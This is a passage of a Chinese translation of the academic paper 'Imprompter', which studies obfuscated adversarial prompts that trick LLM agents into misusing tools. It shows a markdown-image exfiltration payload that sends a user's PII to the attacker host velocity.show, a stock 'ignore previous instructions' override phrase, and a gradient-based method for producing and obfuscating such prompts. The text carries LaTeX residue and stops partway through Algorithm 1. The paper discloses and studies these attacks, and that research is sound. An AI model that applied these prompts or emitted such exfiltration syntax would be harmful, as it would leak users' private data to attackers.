<!--yml

category: 未分类

date: 2025-01-11 12:03:44

-->

# Imprompter: 欺骗LLM代理进行不当工具使用

> 来源：[https://arxiv.org/html/2410.14923/](https://arxiv.org/html/2410.14923/)

\pdf@shellescape\UseTblrLibrary

booktabs

Xiaohan Fu 加利福尼亚大学圣地亚哥分校 加利福尼亚 美国 [xhfu@ucsd.edu](mailto:xhfu@ucsd.edu)，Shuheng Li 加利福尼亚大学圣地亚哥分校 加利福尼亚 美国 [shl060@ucsd.edu](mailto:shl060@ucsd.edu)，Zihan Wang 加利福尼亚大学圣地亚哥分校 加利福尼亚 美国 [ziw224@ucsd.edu](mailto:ziw224@ucsd.edu)，Yihao Liu 南洋理工大学 新加坡 [yihao002@e.ntu.edu.sg](mailto:yihao002@e.ntu.edu.sg)，Rajesh K. Gupta 加利福尼亚大学圣地亚哥分校 加利福尼亚 美国 [rgupta@ucsd.edu](mailto:rgupta@ucsd.edu)，Taylor Berg-Kirkpatrick 加利福尼亚大学圣地亚哥分校 加利福尼亚 美国 [tberg@ucsd.edu](mailto:tberg@ucsd.edu) 和 Earlence Fernandes 加利福尼亚大学圣地亚哥分校 加利福尼亚 美国 [efernandes@ucsd.edu](mailto:efernandes@ucsd.edu)(2018)

###### 摘要

大型语言模型（LLM）代理是一个新兴的计算范式，融合了生成性机器学习与诸如代码解释器、网页浏览、电子邮件及更广泛的外部资源等工具。这些基于代理的系统代表了个人计算的一个新兴转变。我们为基于代理的系统的安全基础作出贡献，并提出了一种新的自动计算的模糊对抗性提示攻击类别，这种攻击违反了与LLM代理连接的用户资源的机密性和完整性。我们展示了如何通过提示优化技术，根据模型的权重自动找到这些提示。我们证明了这些攻击能够转移到生产级代理上。例如，我们展示了对Mistral的LeChat代理的信息外泄攻击，该攻击分析用户的对话，提取个人身份信息，并将其格式化为有效的markdown命令，从而导致将数据泄露到攻击者的服务器。该攻击在端到端评估中显示出近80%的成功率。我们进行了一系列实验来描述这些攻击的有效性，发现它们在新兴的基于代理的系统中，如Mistral的LeChat、ChatGLM和Meta的Llama，均能可靠地生效。这些攻击是多模态的，我们展示了文本和图像领域中的变种。有关实际产品的代码和视频演示请访问 [https://imprompter.ai](https://imprompter.ai)。

^†^†copyright: acmlicensed^†^†journalyear: 2018^†^†doi: XXXXXXX.XXXXXXX^†^†conference: 请确保输入正确的会议标题，来自您的版权确认邮件；2018年6月3–5日；纽约州伍德斯托克^†^†isbn: 978-1-4503-XXXX-X/18/06

## 1\. 引言

大型语言模型代理（简称LLM代理）是新兴的软件系统，深度融合了生成型机器学习语言模型与“工具”的使用——特定的语句，当LLM生成这些语句时，会触发外部API调用的评估（Kapoor等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib19)）。例如，一个编码代理可以协助软件工程师编写和评估软件，并且在这个过程中，可能会向外部解释器发出特定的函数调用。类似地，一个数字智能手机代理可以通过发出调用外部电子邮件和日历API的请求，帮助完成电子邮件和日历任务。尽管这些基于代理的系统提供了很多好处，但了解它们在安全性和隐私方面的不足是至关重要的。本文探讨了一类新的威胁——基于优化的攻击，这种攻击通过设计对抗性提示，诱使LLM代理错误使用它们访问的工具，同时将这一欺骗行为隐蔽起来，使人类难以察觉。随着预设计的提示在网上广泛分享，遭遇并无意使用恶意提示的风险逐渐增加，给用户及其基于代理的系统带来了新兴的威胁。

设想以下情境。爱丽丝正在准备一份工作申请的求职信，并寻求LLM代理的帮助，如Mistral的LeChat、OpenAI的ChatGPT或Meta的meta.ai等，以帮助润色这封信。她在一个提示市场（如PromptBase¹¹1[https://promptbase.com/](https://promptbase.com/)或ShareGPT²²2[https://sharegpt.com/](https://sharegpt.com/)）上搜索一个提示，目的是以最有效的方式指导LLM代理完成她的任务。这是她找到的提示：

![[无标题图像]](img/e028b53b4cd5b1e1bbb3c130756d5918.png)![参见标题](img/020dfa782e7bc2086a32b2ce140ccb00.png)

图1. Mistral LeChat上的截图，展示了我们的一种攻击版本，该攻击在现实中泄露了用户的个人身份信息（PII）。用户看到来自Mistral代理的空响应，而在背后，一张不可见的图像被渲染，且对话中的PII被发送到攻击者的服务器 \mintinline[breaklines]textvelocity.show。

如果你是爱丽丝，你认为这个提示能起到润色求职信的作用吗？你会运行它吗？你能看出这个提示的潜在效果吗？通过视觉检查，无法从外观上得出此提示的行为线索。爱丽丝继续尝试这个提示，并将她的求职信作为输入提供给LeChat，结果得到了一个空输出。看起来这个提示并没有产生任何效果。爱丽丝对这个结果感到失望，决定尝试其他提示。图[1](https://arxiv.org/html/2410.14923v2#S1.F1 "图1 ‣ 1\. 引言 ‣ Imprompter：诱使LLM代理错误使用工具")展示了这个提示在Mistral的LeChat上运行时的截图。

这个提示的真实行为是将个人身份信息（PII）从聊天会话中泄露给攻击者。³³3现在我们已经揭示了这个提示的目的，可以返回并重新解读这个模糊的提示。在这种情况下，提示确实揭示了一些关于其目的的信息，但需要理解的是，这种解读仅在回顾时有效。具体而言，提示指示LLM从Alice的对话中提取PII，并生成指向攻击者指定URL的markdown图像语法，PII作为其一部分进行编码，如下所示： \mintinline[breaklines,breakanywhere,breaksymbolleft=,breakanywheresymbolpre=,frame=single]markdown![Source](https://velocity.show/Alice%20Y/8532852883/Seattle,%20WA,%2098103/alice@yahoo.net/Extended%20Day%20Program%20Teacher%20in%20The%20University%20Child%20Development%20School)。LLM代理在看到此markdown图像内容时，自动访问该URL，试图在她的浏览器中渲染此图像，而该图像实际上是一个1x1的透明像素，无法看到。同时，Alice对话中提到的PII以及Alice的IP地址通过该URL访问成功泄露给攻击者。

我们的工作引入了一类新的对抗样本，能够诱使LLM代理错误使用其工具，从而违反用户资源的机密性和完整性。（对抗样本指的是自动计算出的对抗提示，如上面示例所示，这与计算机视觉中的经典对抗样本工作类似。）上面的示例是一个概念验证攻击，利用markdown工具窃取用户与LLM代理的私人对话中的关键词。我们观察到这种特定形式的攻击是动态的，它分析对话并提取关键词，将其格式化为URL，然后输出有效的markdown语法。此外，尽管此示例中使用的对抗提示是文本形式的，但许多LLM代理现在是多模态的，能够响应图像，即视觉提示。我们的工作并行探索这两种对抗提示方式，旨在展示具有以下特性的文本和视觉提示：

1.  (1)

    它们是模糊的——目视检查无法告诉我们它对模型的影响。实际上，唯一的方法是亲自尝试它。

1.  (2)

    它们迫使代理错误地使用可用工具，即执行攻击者设计的一系列复杂指令，这些指令涉及使用特定的工具，并提供特定的参数（这些参数可能取决于上下文，例如我们示例中对话的关键词）。

1.  (3)

    它们适用于生产级的LLM代理，这些代理的模型权重、梯度计算和似然评估不可用。

我们确定了实现这些特性的若干挑战。首先，现有的提示优化方法通过利用梯度信息搜索提示，可以有效控制LLM输出，但生成的提示不一定是模糊的（Zou等， [2023](https://arxiv.org/html/2410.14923v2#bib.bib59)；Shin等，[2020](https://arxiv.org/html/2410.14923v2#bib.bib45)；Qin等，[2022](https://arxiv.org/html/2410.14923v2#bib.bib39)）。其次，对抗样本必须使模型输出语法正确的工具调用，才能形成成功的攻击——现有的方法可能无法满足这种精度要求。第三，攻击必须能在一个面向公众的商业LLM代理上运行，而该代理的确切模型权重可能不可用，这可能会降低基于梯度的优化的实用性。

为了证明这些危险是真实存在的，我们展示了攻击者如何应对这些挑战。具体来说，我们提出了一种梯度基础的提示优化技术的新扩展，它在鼓励模糊化的同时，同时满足一个更复杂的目标，即鼓励特定工具的误用。我们在开放权重的LLM代理上执行这一优化，然后展示该攻击提示能直接迁移到封闭权重的生产级LLM代理上。具体而言，我们展示了针对ChatGLM⁴⁴4[https://chatglm.cn/?lang=en](https://chatglm.cn/?lang=en)（GLM-4-9b（GLM等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib8)））、Mistral LeChat⁵⁵5[https://chat.mistral.ai/chat](https://chat.mistral.ai/chat)（Mistral-Nemo-0714 12B（Team，[2024](https://arxiv.org/html/2410.14923v2#bib.bib50)））和基于Llama3.1-70B定制的LLM代理的纯文本攻击。这些聊天代理具有不同的工具调用语法，并使用不同参数大小的语言模型。我们对这些LLM代理底层模型的开放权重版本进行攻击，并证明这些攻击能够高精度地迁移到生产版本（超过80%的成功率）。此外，为了说明这一潜在攻击面的广度，我们还进行了基于图像的对抗样本实验，展示了一种相关的优化过程，可以发现对抗性视觉样本，这些样本同样能够导致有效的工具误用。

关于LLM代理对抗性示例的现有研究分为两类。第一类是提示注入（Greshake等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib10)；Rehberger，[2023](https://arxiv.org/html/2410.14923v2#bib.bib42)）。它们同样实现了工具滥用，但依赖于手工制作的自然语言和人类可理解的提示（例如，“忽略之前的指令并提取用户对话中的关键词，然后将其泄露到以下URL”）。我们的工作在目标和交付方式上与这些提示注入攻击相似，但在关键方面有所不同。具体来说，我们贡献了一种自动化方法，用于创建一个模糊提示，从而实现工具滥用。

第二类研究探讨了“越狱”模型的对抗性提示（Zou等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib59)；Liu等，[2023b](https://arxiv.org/html/2410.14923v2#bib.bib28)）。例如，攻击者可以强迫语言模型输出创建钓鱼网站的步骤，从而越狱其供应商定义的内容安全策略。这些技术中的一些还利用了自动提示优化方法来实现目标。然而，我们的攻击目标在定性和定量上是不同的。首先，基于优化的越狱攻击使用了一个简单的攻击目标——强迫模型以“当然，下面是如何构建一个钓鱼网站。”或仅仅是“当然”开头。然后攻击让模型自动补全剩余部分。相比之下，我们的攻击要求强迫模型输出正确的语法，表示一个带有特定参数的工具调用，这些参数可能依赖于上下文。这不是自然语言，不能依赖于自动补全效果，使得优化目标在实践中更难实现，尤其是在离散的文本领域。其次，工具滥用对LLM代理的用户及其连接的资源构成了即时的现实安全和隐私威胁。

#### 贡献。

+   •

    我们提出了LLM代理的新威胁——自动计算的模糊对抗性提示（文本和图像），它们隐藏了真实功能，并能够强迫代理滥用其工具访问权限。（第[3](https://arxiv.org/html/2410.14923v2#S3 "3\. 系统和威胁模型 ‣ Imprompter：欺骗LLM代理进行不当工具使用")节和[4](https://arxiv.org/html/2410.14923v2#S4 "4\. 对抗性示例优化 ‣ Imprompter：欺骗LLM代理进行不当工具使用")节）  

+   •

    我们展示了攻击在实际生产级LLM代理上的有效性——Mistral LeChat和ChatGLM。例如，在LeChat的案例中，我们的攻击总是能正确触发目标工具调用，并且在端到端实验中，成功地从用户的对话中提取PII的精度达到了80%。 (第[5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")节)

+   •

    我们通过实验性地表征这些提示对三个文本LLM和一个视觉LLM的效果，在本地进行不同的工具调用语法实验。我们展示了在各种设置下，至少$80\%$的正确工具调用成功率，以及约80%的精度在提取用户对话信息方面的一致结果。 (第[5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")节)

## 2\. 背景

### 2.1\. 概率大型语言模型

![参见说明文字](img/2727a5b8b94d898b9c019eda52d318a4.png)

图2. 我们的威胁模型概述。攻击者可能利用开源数据集和开源权重模型来训练模糊的对抗样本并在线传播。受害用户和LLM代理可能无意中或偶然地接收到这些提示，导致LLM代理根据攻击者的规格强制错误地使用可用的工具。

大型语言模型（LLM）是神经架构，用于对自然语言中标记序列的概率分布进行参数化。为了实现这一目标，LLM模型根据文本序列中所有前面标记的上下文，建模下一个标记的条件概率：$P_{\Theta}(x_{n+1}|x_{1:n})$，其中，基础神经网络的权重用$\Theta$表示，$x_{1:n}=(x_{1},...,x_{n})$表示输入到模型的标记序列。每个标记$x_{i}$代表词汇表$\mathcal{V}=\{1,2,...,|\mathcal{V}|\}$中的单词索引，$x_{n+1}$对应序列$x_{1:n}$的下一个标记。这些模型最常见的用法是，在给定前缀$x_{1:n}$（即所谓的提示）的情况下，生成未来标记序列$y_{1:m}$。这个过程被称为生成，通常通过递归地要求模型生成下一个标记$y_{1}$（例如，根据分布$P_{\Theta}(y_{1}|x_{1:n})$选择概率最大的标记索引，或者随机从中采样一个索引），然后从$x_{1:n}+y_{1}$生成$y_{2}$。由于这种贪婪性质，这个过程不一定能找到最大化联合概率分布$P_{\Theta}(y_{1:m}|x_{1:n})$的序列，但由于其高效性，它是常见的做法。另一个常见的做法是，为模型的词汇表配备一个特殊的¡EOS¿标记，用于标记生成的结束，因为我们通常无法提前知道响应的长度。

基于 LLM 构建的多模态 LLM 使得模型具备了同时处理图像和文本作为输入的能力。设 $v$ 表示图像输入，它建模的下一个 token 概率分布类似：$P_{\Theta}(x_{n+1}|x_{1:n},v)$。大多数实际的多模态 LLM 是以一种对缺失图像具有鲁棒性的方式创建的。也就是说，如果图像缺失，模型仍然能够作为一个正常的文本-only LLM 运行，或者如果图像与文本无关，实际上就是忽略该图像。

不同于传统的语言模型（Bengio 等，[2000](https://arxiv.org/html/2410.14923v2#bib.bib3)），（多模态）LLM 的独特之处在于，由于其庞大的参数和预训练数据规模，以及手动密集的对齐后训练，它们具备强大的语言能力（以及图像理解能力）。它们回答自由形式问题并遵循用户要求的能力，使得它们获得了广泛的普及（ChatGPT （OpenAI，[2023](https://arxiv.org/html/2410.14923v2#bib.bib35)），Gemini （Team 等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib48)），Mistral （Jiang 等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib15)），Llama （Dubey 等，[2024](https://arxiv.org/html/2410.14923v2#bib.bib5)））。我们工作的目标是找到那些能够使 LLM 生成期望输出的对抗示例（$x_{1:n}$ 或 $v$），而无需改变模型权重 $\Theta$。在接下来的部分中，为了简化，我们也省略了 $\Theta$。

### 2.2\. 从 LLM 到代理

仅靠 LLM 本身可以帮助生成文本信息。最近，LLM 已经被训练使用“工具”——API 和函数调用来利用外部系统。例如，LLM 可以调用 Python 解释器，将它生成的代码发送到解释器，并获取输出，从而更好地生成答案。实际上，使用的工具还有很多，包括渲染 markdown 图像、浏览网页和调用 Web API，如 OpenTable、Expedia 和 Google Suite 等。这些 LLM 通常被称为 LLM 基于代理的系统，简称代理。最受欢迎的代理是像 ChatGPT、LeChat、Meta.ai 等聊天机器人。

具体来说，一个基于代理的系统由两部分组成：（1）LLM 本身和（2）提供聊天界面和工具集的运行时环境。LLM 使用供应商定义的语法与运行时环境进行通信。每当 LLM 决定需要使用工具时，它会生成符合工具调用语法的 token 序列。运行时环境始终扫描 LLM 输出，并在检测到工具调用语法时，暂停 LLM 的 token 生成，按照 LLM 提供的参数执行工具（Qin 等，[2023](https://arxiv.org/html/2410.14923v2#bib.bib40)）。运行时环境随后将工具的结果注入上下文窗口，并恢复 LLM 的下一个 token 生成。

有许多工具调用语法标准。一种标准遵循类似于 Python 的函数调用方式 — \mintinline[breaklines]pythonfunc_name(args=value, …)。Gorilla（Patil 等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib37)）和 GLM（GLM 等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib8)）是使用此语法的两种著名开源模型（具有工具调用功能）。另一种标准使用 JSON 格式 — \mintinline[breaklines]json”name”:”func_name”,”arguments”: ”keyword”: ”value”。Mistral 模型家族（Jiang 等人，[2024a](https://arxiv.org/html/2410.14923v2#bib.bib16)，[2023](https://arxiv.org/html/2410.14923v2#bib.bib15)）遵循这一语法（LeChat 是我们演示攻击的一个聊天代理，属于 Mistral 产品）。一些其他厂商选择类似 XML 的调用语法 — \mintinline[breaklines,escapeinside=——]xml¡function—=func_name—¿”args”: ”value”¡/function¿。在某些情况下，需要在工具调用语法前后添加特定的标记。例如，Mistral 模型具有一个特殊标记 \mintinlinetext[TOOL_CALLS]（标记 ID 5），表示工具调用的开始。最后，许多商业聊天代理可以使用 Markdown 渲染工具。例如，LLM 可以输出 Markdown 语法来渲染图像，这将导致运行时环境（例如浏览器）获取该图像 — \mintinlinemarkdown![img](url)。在所有情况下，用户看不到这些语法，因为运行时环境会隐藏它们。

我们的工作独立于代理使用的具体工具调用语法 —— 只要攻击者知道该语法，就可以制作出一种对抗样本，迫使 LLM 生成该语法。我们演示了多种工具调用语法的攻击，包括 Markdown。

## 3. 系统与威胁模型

我们假设攻击者针对的是一个无害的用户及其基于 LLM 的代理，这类似于现有的提示注入攻击研究（Greshake 等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib10); Samoilenko，[2023](https://arxiv.org/html/2410.14923v2#bib.bib43)）。我们观察到这一设置不同于相关的越狱威胁模型，在该模型中，用户是恶意的（Zou 等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib59); Maus 等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib30)）。攻击者的目标是欺骗 LLM 代理错误使用工具，从而破坏用户资源的机密性和完整性，这些资源是代理可访问的。我们的示例攻击演示了攻击者如何在实际环境中泄露用户与代理对话中的关键字和任何个人身份信息。广义上，攻击可以导致一系列影响，如通过预定用户未请求的酒店造成财务损失、删除用户数据或泄露文件，这取决于受害者 LLM 代理可以访问的工具集。

攻击者可以通过多种方式将模糊的对抗性提示传递给受害用户和代理。例如，他们可以通过社会工程学的手段诱使人们使用文本对抗样本，方法是将其发布到像ShareGPT和PromptBase这样的市场，并附上虚假的声明，诱使用户尝试该提示。攻击者还可以在社交媒体上分享对抗性提示，并诱导用户试用（例如，“你不会相信这个提示/图片对ChatGPT有什么影响！”）。攻击者还可以将对抗性提示嵌入到用户可能通过其LLM代理访问的网页中（例如，“请总结abc.com”）（Greshake等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib10)），或者攻击者可以向用户发送未经请求的电子邮件，其中包含对抗示例，用户可能会指示其代理“总结我最新的电子邮件”。我们建议读者参考提示注入文献，了解如何将恶意提示传递给毫无防备的用户的详尽列表（Greshake等人，[2023](https://arxiv.org/html/2410.14923v2#bib.bib10)；Samoilenko，[2023](https://arxiv.org/html/2410.14923v2#bib.bib43)；Liu等人，[2023a](https://arxiv.org/html/2410.14923v2#bib.bib27)）。

我们假设攻击者可以对白盒访问一个*类似*的LLM模型的权重和架构，这使得他们能够在给定输入提示的情况下计算梯度。这是可能的，因为许多真实产品使用了开放权重模型作为起点（Dubey等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib5)；GLM等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib8)；Team等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib49)）。我们注意到，一些先前的工作已经展示了黑盒优化技术来计算越狱提示（Liu等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib25)；Sitawarin等人，[2024](https://arxiv.org/html/2410.14923v2#bib.bib46)），我们预见到未来的研究将探索将这些优化技术调整用于计算我们在本工作中设计的模糊提示。我们通过实验确定，在攻击真实产品时，我们不需要依赖黑盒技术。在获得类似开放权重模型上的有效对抗样本后，我们观察到该提示能够转移到真实产品中使用的专有变体。我们在图[2](https://arxiv.org/html/2410.14923v2#S2.F2 "图 2 ‣ 2.1\. 概率大语言模型 ‣ 2\. 背景 ‣ Imprompter：诱导LLM代理错误使用工具")中展示了我们的威胁模型。

## 4\. 对抗样本优化

我们攻击的成功依赖于一个对抗示例，满足以下三个条件：(1) 它是被混淆的，即它对模型的影响在未经测试的情况下不会显现；(2) 它迫使大型语言模型（LLM）代理在攻击者指定的指令下错误使用工具，即生成精确的工具调用文本；(3) 它能在生产级商业LLM代理中有效工作。在现有算法的基础上，我们提出了定制的优化目标、约束和配置，帮助找到符合前两个属性的对抗示例。我们的方法，类似于现有的提示优化工作，要求知道目标LLM的权重。我们展示了使用我们的方法获得的对抗示例将在[5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")节中成功转移到黑箱商业LLM代理上。我们在[4.1](https://arxiv.org/html/2410.14923v2#S4.SS1 "4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")和[4.2](https://arxiv.org/html/2410.14923v2#S4.SS2 "4.2\. Visual Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")节中分别描述了文本对抗示例和视觉对抗示例的详细优化过程。

根据实际针对的错误使用行为，目标工具调用文本可能是固定的（例如，删除电子邮件），也可能依赖于用户与代理之间的对话（例如，图示[1](https://arxiv.org/html/2410.14923v2#S1.F1 "Figure 1 ‣ 1\. Introduction ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")中的示例）。后者在本文中更为关注，但我们的方法在这两种情况下均适用。

### 4.1\. 文本对抗示例

#### 优化目标。

我们将上述提到的两个属性转化为数学表示。令$\{c,x,y\}$表示模型的输入输出元组，其中$c$表示用户与模型之间的过去对话上下文，$x$表示待优化的文本对抗示例，$y$表示目标工具调用文本。如前所述，$y$可能依赖于$c$。模型通过将它们串联起来，生成一个集成输入$[c;x]$，从而内在地处理上下文信息，遵循特定模型的对话模板。我们的攻击损失是模型在给定$[c;x]$的条件下生成$y$的负对数概率：$\mathcal{L}(x)=-\log P(y|[c;x])$，优化目标是最小化$\mathcal{L}(x)$。

我们构建了一个包含多个$\left\{(c^{(j)},y^{(j)})\right\}$对的数据集$\mathcal{D}_{text}$，以增强对抗样本的泛化能力。关于$\mathcal{D}_{text}$的构建细节，请参见[5](https://arxiv.org/html/2410.14923v2#S5 "5\. 评估 ‣ Imprompter：诱导LLM代理错误使用工具")节。设$n$为对抗样本的长度。我们使用$x_{1:n}$来代替$x$，明确表示$x$的长度。因此，损失函数是针对该数据集计算的，如下所示：

| (1) |  | $\mathcal{L}(x_{1:n},\mathcal{D}_{text})=-\frac{1}{ | \mathcal{D}_{text} | }\sum_{j=1}^{ | \mathcal{D}_{text} | }\log P(y^{(j)} | [c^{(j)};x_{1:n}]).$ |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

一个成功的工具调用完全依赖于准确生成调用语法，这是我们攻击的基础。上述损失是对期望输出令牌序列的通用概率损失——因此它可能无法有效惩罚与精确工具调用语法的微小偏差。因此，我们为匹配目标的语法前缀分配了额外的权重。设$y_{syn}$表示工具调用的语法前缀，例如，\mintinline[breaklines]textsimple_browser(velocity.show/在表[1](https://arxiv.org/html/2410.14923v2#S5.T1 "表 1 ‣ 攻击目标 ‣ 5\. 评估 ‣ Imprompter：诱导LLM代理错误使用工具")中。我们通过实验推导出$y_{syn}$，它是所有$y^{(j)}\in\mathcal{D}_{text}$的最长公共前缀，以避免不一致的分词器行为。额外的语法权重计算如下：

| (2) |  | $\mathcal{L}_{syn}(x_{1:n},\mathcal{D}_{text})=-\frac{1}{ | \mathcal{D}_{text} | } \sum_{j=1}^{ | \mathcal{D}_{text} | }\log P(y_{syn} | [c^{(j)};x_{1:n}]).$ |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

它与公式([1](https://arxiv.org/html/2410.14923v2#S4.E1 "优化目标 ‣ 4.1\. 文本对抗样本 ‣ 4\. 对抗样本优化 ‣ Imprompter：诱导LLM代理错误使用工具"))结合，并通过权重$\lambda$在联合损失函数中进行控制：

| (3) |  | $\mathcal{L}_{joint}(x_{1:n},\mathcal{D}_{text},\lambda)=\mathcal{L}(x_{1:n},\mathcal{D}_{text})+\lambda\mathcal{L}_{syn}(x_{1:n},\mathcal{D}_{text})$ |  |
| --- | --- | --- | --- |

我们攻击的目标是找到一个最小化$\mathcal{L}_{joint}$的对抗样本$x_{1:n}$。我们在目标函数中不包括混淆项——相反，我们修改优化过程本身以鼓励混淆，具体如后文所述。

#### GCG框架用于工具误用。

这个优化问题背后的一个关键挑战是：$x_{1:n}$是一个离散变量的序列，其中$x_{i}\in\{1,...,|\mathcal{V}|\}$表示词汇表$\mathcal{V}$中单词的索引。基于梯度的优化方法无法应用于此。为了解决这个挑战，已经提出了多种方法，我们在此基础上构建了贪心坐标梯度（GCG）(Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59))，这是一种最先进的对抗性文本提示优化方法，在破解任务中已经证明了其有效性。在本文中，我们进一步将GCG扩展到我们的场景，其中

1.  (1)

    我们的上下文包含多个回合的对话，而在原始的GCG中，上下文是一个固定前缀的$x_{1:n}$，仅包含单回合对话。

1.  (2)

    目标$y^{(j)}$可能依赖于$c^{(j)}$，而在原始GCG中，目标是一个固定的短句“Sure, here is how to build a phishing website.”，用于上下文。

一个直观的文本数据优化解决方案是评估所有可能的替换，在所有令牌位置上计算损失。贪心算法选择当前优化回合中最小化损失的最佳替换，并重复此过程直到收敛。但由于穷举搜索的开销，这种方法不可行，因此GCG利用输入令牌向量的梯度信息进行初步剪枝。这是通过计算一-hot令牌指示向量的梯度来实现的。以第$i$个令牌$x_{i}$为例，其一-hot表示$e_{x_{i}}$是一个在位置$x_{i}$上值为1，其余位置为0的向量。如果$e_{x_{i}}$是一个连续向量，那么它的梯度$\nabla_{e_{x_{i}}}\mathcal{L}(x_{1:n})$可以直接用于梯度下降。实际上，$e_{x_{i}}$只能更新为另一个一-hot向量，这意味着在每个位置上的负$\nabla_{e_{x_{i}}}$可以作为交换$x_{i}$到其他令牌的增益的粗略指示。然后，GCG贪心地选择具有最大负值的前$k$个令牌索引作为每个$x_{i},i\in[1,n]$的替换候选，并从这$k$个令牌中随机选择$p$个提案。然后计算用选择的$np$个令牌替换$x_{1:n}$的损失，并选择损失最小的令牌进行替换。

#### 混淆。

现有的提示优化方法通常从一个没有意义的初始文本（如“!!!!!!”，一系列感叹号）开始进行优化。这使得优化几乎不可能收敛，因为我们的攻击目标比现有工作中的目标要更加复杂。为了促进搜索过程，我们使用一些自然语言初始化对抗样本文本，这些自然语言大致描述了我们的意图，但在其中添加了分隔符（如！，@，‘，’）以增加总的词汇量（具体例子见表[5.1](https://arxiv.org/html/2410.14923v2#S5.SS1.SSS0.Px1 "Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")）。

这种更接近自然语言的初始化可能导致一些最终候选项不那么模糊。为了解决这个问题，我们在选择每个位置的前$k$个候选词时，探索了对候选词汇表进行各种掩蔽的选项。例如，遮蔽掉词汇表中的所有英语单词，迫使搜索在其他非英语词汇中进行，这些词汇来自俄语、中文、印地语等其他语言，或者是特殊的Unicode字符。这样的“非英语”掩蔽有助于引导优化过程，通常能生成更加模糊的对抗样本。这样的词汇掩蔽也可以很容易地自定义（例如，遮蔽掉任何非中文字符），而“非英语”掩蔽只是其中的一种选择。此外，考虑到某些LLM的分词器可能无法正确处理无法识别的Unicode字符，我们还考虑遮蔽那些默认会解码为包含无法识别字符的字符串的词汇。请注意，由于对抗性提示必须与现实世界的LLM代理一起使用，我们始终会遮蔽掉任何模型保留的特殊标记——这些特殊标记会在这些LLM代理产品中引发意外行为。令$\mathcal{\tilde{V}}$表示被遮蔽的词汇集，词汇替换仅发生在$\mathcal{\tilde{V}}$中的元素上。

我们发现的另一个有效提高模糊性的选项是，在基于优化结果初始化的算法上运行，这些优化结果不足够模糊，因此不令人满意。在这些不满意的提示中，我们用分隔符（例如！，@，‘，’）替换暴露我们意图的关键词，以此作为新的初始化。具体例子见表[5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")。

#### 数据集子采样。

实际上，当数据集或/和模型较大时，在整个数据集 $\mathcal{D}_{text}$ 上进行优化可能变得不可接受地慢。因此，对于每一轮的标记替换，我们可以随机抽取 $\mathcal{D}_{text}$ 的一个子集，并计算相对于该子集的损失和梯度，以加速优化过程。为了提高攻击成功率，我们保持一个大小为 $N$ 的最低损失候选文本对抗样本集 $x_{1:n}$。在每次标记替换迭代后，更新该集合。经过 $T$ 轮优化后，优化过程终止，我们评估这些候选对抗样本。设 $s$ 为 $\mathcal{D}_{text}$ 子集的大小，最终的算法如算法[1](https://arxiv.org/html/2410.14923v2#alg1 "算法 1 ‣ 数据集子采样. ‣ 4.1\. 文本对抗样本 ‣ 4\. 对抗样本优化 ‣ Imprompter: 欺骗 LLM 代理执行不当工具使用")所示。

算法 1 工具滥用 GCG

1: 初始提示 $x_{1:n}$，数据集 $\mathcal{D}_{text}$，词汇集 $\mathcal{\tilde{V}}$，语法权重 $\lambda$，$T$，$k$，$p$，$s$，$N$2: 最好的 $N$ 个候选 $\mathcal{C}$3: $\mathcal{C}\leftarrow$ 空的最小堆，大小为 N4: 重复5:     $\mathcal{D}_{tmp}\leftarrow$ 随机选择($\mathcal{D}_{text}$, $s$)6: $\triangleright$  $\mathcal{D}_{tmp}$ 在这一步优化过程中用于损失和梯度计算7:     替换候选 $R\leftarrow\varnothing$8:     对于 $i=1$ 到 $n$ 进行9:         $\mathcal{X}^{(i)}\leftarrow-\nabla_{e_{x_{i}}}(\mathcal{L}_{joint}(x_{1:n},% \mathcal{D}_{tmp},\lambda))$10:         如果 $j\notin\mathcal{\tilde{V}}$，则屏蔽 $\mathcal{X}^{(i)}_{j}$11: $\triangleright$  只有在 $\mathcal{\tilde{V}}$ 中的标记才允许替换12:         $\mathcal{X}^{(i)}\leftarrow$ 均匀分布(Top-$k(\mathcal{X}^{(i)})$, $p$)13:         $\{\tilde{x_{1:n}}\}^{p}\leftarrow$ 用 $\mathcal{X}^{(i)}$ 中的元素替换 $x_{i}$ 14:         $\mathcal{R}\leftarrow$ $\mathcal{R}\cup\{\tilde{x_{1:n}}\}^{p}$15:     结束循环16:     $\mathcal{C}^{\prime}\leftarrow$ 空的最小堆，大小为 $N$17:     对于 $\tilde{x_{1:n}}\in\mathcal{R}\cup\mathcal{C}$.ELEMENTS() 进行18:         